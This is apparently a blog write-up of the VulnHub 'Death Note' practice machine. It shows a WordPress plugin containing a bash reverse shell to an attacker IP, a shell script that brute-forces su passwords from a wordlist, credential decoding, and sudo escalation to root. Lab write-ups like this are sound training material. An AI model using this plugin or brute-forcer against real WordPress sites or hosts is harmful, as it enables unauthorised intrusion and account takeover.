---
layout: single
title: Death note vulnhub writeup
excerpt: "Very easy linux machine in which we upload a malicious php plugin to wordpress, bruteforce a user's password and find unexpected files in the system"
date: 2022-09-01
classes: wide
header:
  teaser: /assets/images/deathnote/icon-deathnote.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - writeup
tags:
  - vulnhub
  - bash scripting
  - bruteforcing
  - wordpress
---

![](/assets/images/deathnote/deathnote.gif)

# Death Note
# User flag

let's see the open ports

```shell
nmap -p- -n -Pn -sS --min-rate 5000 -vv -oN allports 192.168.1.60
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```shell
nmap -sCV -p80,22 -oN targeted 192.168.1.60
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

Pretty standard so far, let's check the webpage. When trying to connect to the ip it redirects us to deathnote.vuln and gives an error since obviously there is no dns record and we do not have it defined in /etc/hosts therefore let's do the second thing, in my case.

```shell
192.168.1.60    deathnote.vuln
```

Now we have a wordpress site and before running wpscan I noticed a line of text that clearly looks like a password for me `my fav line is iamjustic3`. Next I tried the password in the wp-admin with user kira (the user that made the post) and it worked I was already admin in the site. Now we just have to get a reverse shell. But first I checked the files in the wordpress admin site a found a notes.txt file that seems like a password dictionary, it may be useful later.

The method we used in the [Mr.robot](2022-08-15-Mrrobot-Writeup.md) and in the [Dobby](2022-08-23-Dobby-Writeup.md) machine doesn't work in this one (changing the php template to a reverse shell). However there is another popular method, installing a malicious plugin, in my case

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.13/7777 0>&1'");
?>
```

Put this into a php file and then zip it, then go to the plugins page, click add new and click upload plugin,once you activate it make sure you are listening with netcat to get the connection.

```shell
Connection from 192.168.1.60:58254
bash: cannot set terminal process group (527): Inappropriate ioctl for device
bash: no job control in this shell
www-data@deathnote:/var/www/deathnote.vuln/wordpress/wp-admin$
```

Once in I started searching in the directories going down one by one and found a file called important.jpg in /var/www/deathnote.vuln that is just plain text, it says:


```text
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site
```

I found two user.txt files one was a user dictionary but I though that was ridiculous since there was only two user on the system kira and l. The other file just contains some brainfuck code with a message saying `i think u got the shell , but you wont be able to kill me -kira`

What I did to get the user was just create a bash script to bruteforce giving it the dictionary we found earlier


```shell
#!/bin/sh

trap "exit 1" INT

if [ $1 -z 2>/dev/null ]
then
        echo "[+] Usage: ./su_brute.sh wordlist"
        exit 1
fi
while read line
do
        echo $line | su l 2>/dev/null
        if [ $? = 0 ]
        then
                echo "[+] password found $line"
                exit 1
        fi
done < $1
```


```shell
www-data@deathnote:/dev/shm$ cp /var/www/deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt .
www-data@deathnote:/dev/shm$ chmod a+x su_brute.sh
www-data@deathnote:/dev/shm$ ./su_brute.sh notes.txt
[+] password found death4me
```

## Root flag

It may take a while to get the password but It will work eventually. Next I logged as l via ssh to get a better tty.Then I tested many privesc vectors but didn't found any so I executed linpeas to help me out and I found this.


```shell
╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Aug 29  2021 .
drwxr-xr-x 18 root root 4096 Jul 19  2021 ..
drwxr-xr-x  4 root root 4096 Aug 29  2021 L
```

there is a L directory in /opt which is quite unusual. Looking inside it I found a case.wav that was again just text encoded in hex and then in base 64

```shell
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav | xxd -r -p | base64 -d; echo
passwd : kiraisevil
```

Now if we log as kira and take a look at his sudo privileges we can escalate to root

```shell
l@deathnote:/opt/L/fake-notebook-rule$ su kira
Password:
kira@deathnote:/opt/L/fake-notebook-rule$ sudo -l
[sudo] password for kira:
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
kira@deathnote:/opt/L/fake-notebook-rule$ sudo su
root@deathnote:/opt/L/fake-notebook-rule# cd /root
root@deathnote:~# cat root.txt


      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       ::::::::
    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+:
   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+
  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++
 +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########
```

Pretty basic machine with many hints everywhere, really good for beginners and I guess it is even better if you have watched the show (I haven't)
